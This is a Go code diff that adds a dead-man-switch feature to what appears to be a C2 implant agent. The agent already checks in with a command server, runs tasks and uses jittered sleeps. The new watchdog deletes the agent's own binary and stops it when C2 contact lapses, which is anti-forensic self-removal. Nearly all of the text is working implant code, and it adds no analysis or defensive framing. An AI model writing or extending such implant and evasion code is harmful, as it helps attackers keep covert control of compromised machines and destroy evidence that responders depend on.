@@ -4,10 +4,13 @@ import (
 	"context"
 	"crypto/rand"
 	"encoding/hex"
+	"fmt"
 	"math/big"
 	"os"
 	"os/user"
 	"runtime"
+	"sync"
+	"sync/atomic"
 	"time"
 
 	"github.com/sirupsen/logrus"
@@ -22,6 +25,9 @@ type Config struct {
 	RetryInterval time.Duration
 	InitialDelay  time.Duration
 	MaxOutput     int
+	// DeadmanTimeout triggers self-destruct when no successful C2 checkin
+	// occurs within this window. 0 disables the watchdog (default).
+	DeadmanTimeout time.Duration
 }
 
 type Agent struct {
@@ -29,6 +35,14 @@ type Agent struct {
 	transport *Transport
 	executor  *Executor
 	stop      chan struct{}
+	stopOnce  sync.Once
+
+	// lastContact holds the unix-nano timestamp of the last successful
+	// checkin; read by the dead-man watchdog.
+	lastContact atomic.Int64
+
+	deadmanMu  sync.Mutex
+	deadmanErr error
 }
 
 func New(cfg Config, transport *Transport) *Agent {
@@ -61,6 +75,12 @@ func New(cfg Config, transport *Transport) *Agent {
 func (a *Agent) Run(ctx context.Context) error {
 	logrus.Infof("agent %s starting (server: %s)", a.cfg.AgentID, a.cfg.ServerURL)
 
+	a.lastContact.Store(time.Now().UnixNano())
+
+	if a.cfg.DeadmanTimeout > 0 {
+		go a.deadmanWatchdog(ctx)
+	}
+
 	if a.cfg.InitialDelay > 0 {
 		delay := a.jitteredSleep(a.cfg.InitialDelay)
 		logrus.Debugf("initial delay: %s", delay)
@@ -73,7 +93,7 @@ func (a *Agent) Run(ctx context.Context) error {
 		case <-ctx.Done():
 			return ctx.Err()
 		case <-a.stop:
-			return nil
+			return a.getDeadmanErr()
 		default:
 		}
 
@@ -90,14 +110,76 @@ func (a *Agent) Run(ctx context.Context) error {
 			continue
 		}
 		failures = 0
+		a.lastContact.Store(time.Now().UnixNano())
 
 		a.processTasks(ctx)
 		a.sleep(ctx, a.jitteredSleep(time.Duration(sleepSec)*time.Second))
 	}
 }
 
+// deadmanWatchdog periodically verifies that the agent has checked in with
+// the C2 server inside the configured window; otherwise it self-destructs.
+func (a *Agent) deadmanWatchdog(ctx context.Context) {
+	interval := a.cfg.DeadmanTimeout / 4
+	if interval > 30*time.Second {
+		interval = 30 * time.Second
+	}
+	if interval <= 0 {
+		interval = time.Second
+	}
+
+	ticker := time.NewTicker(interval)
+	defer ticker.Stop()
+
+	for {
+		select {
+		case <-ctx.Done():
+			return
+		case <-a.stop:
+			return
+		case <-ticker.C:
+			last := time.Unix(0, a.lastContact.Load())
+			if time.Since(last) > a.cfg.DeadmanTimeout {
+				a.selfDestruct()
+				return
+			}
+		}
+	}
+}
+
+// selfDestruct fires the dead-man switch: best-effort removal of the agent
+// binary followed by termination of the agent loop.
+func (a *Agent) selfDestruct() {
+	logrus.Errorf("dead-man switch triggered: no C2 contact in %s", a.cfg.DeadmanTimeout)
+
+	if runtime.GOOS != "windows" {
+		if err := os.Remove(os.Args[0]); err != nil {
+			logrus.Debugf("self-destruct: could not remove binary %s: %v", os.Args[0], err)
+		} else {
+			logrus.Debug("self-destruct: agent binary removed")
+		}
+	}
+
+	a.deadmanMu.Lock()
+	a.deadmanErr = fmt.Errorf("dead-man switch triggered: no C2 contact in %s", a.cfg.DeadmanTimeout)
+	a.deadmanMu.Unlock()
+	a.shutdown()
+}
+
+func (a *Agent) getDeadmanErr() error {
+	a.deadmanMu.Lock()
+	defer a.deadmanMu.Unlock()
+	return a.deadmanErr
+}
+
+func (a *Agent) shutdown() {
+	a.stopOnce.Do(func() {
+		close(a.stop)
+	})
+}
+
 func (a *Agent) Stop() {
-	close(a.stop)
+	a.shutdown()
 }
 
 func (a *Agent) checkin() (int, error) {
